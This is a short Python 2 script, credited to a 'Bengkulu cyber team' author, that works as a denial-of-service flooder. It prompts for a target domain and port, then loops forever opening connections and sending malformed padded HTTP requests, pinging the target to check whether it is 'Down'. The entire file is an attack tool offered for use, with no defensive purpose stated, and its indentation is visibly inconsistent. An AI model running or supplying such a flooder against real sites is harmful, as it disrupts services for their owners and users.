from socket import *
import time
from urllib import urlopen
import subprocess

print(r'''
Write By : Riskis7
YouToube : Bengkulu cyber team
Telegram : Bengkulu cyber team

''')

print

domain = raw_input("\nTarget Domain(example.com)=> ")
port = raw_input("Port(defualt 80)=> ")
t = raw_input ("Time Send Packet=> ")

if port == '':
	       port = 80
if t == '':
       	 t = 1

u = urlopen("http://"+domain)
server = dict(u.headers)['server']
ip = gethostbyname(domain)

print
print "[+]ipaddress => ",ip
print "[+]server => ",server
print 

num = 0
count = 100
print "[*] Starting Attack to ",ip,'....\n'

while True:
  s = socket(AF_INET , SOCK_STREAM)
  try:
	              	s.connect((domain , int(port)))
  except:
	              	print "\n[!] Not Connected\n"
	               exit()
  s.send("GET http://"+domain+" HTTP 1.1\r\n"+"A"*100)
  num = num+1
  if num == count:
	               print "\n[*] request ping for check ...\n"
		              ping = subprocess.check_output("ping "+domain)
		              if "Request Time Out." in ping:
		                              print "\n[+] please run ping for ",domain,"\nDomian may become is **Down** :)\n"
			                             raw_input("for send packet again press enter ...\n")
		              else:
	                       	pass
		              count += 100


  print "[+] Sendig Packet ",num
  time.sleep(int(t))

s.close()

 

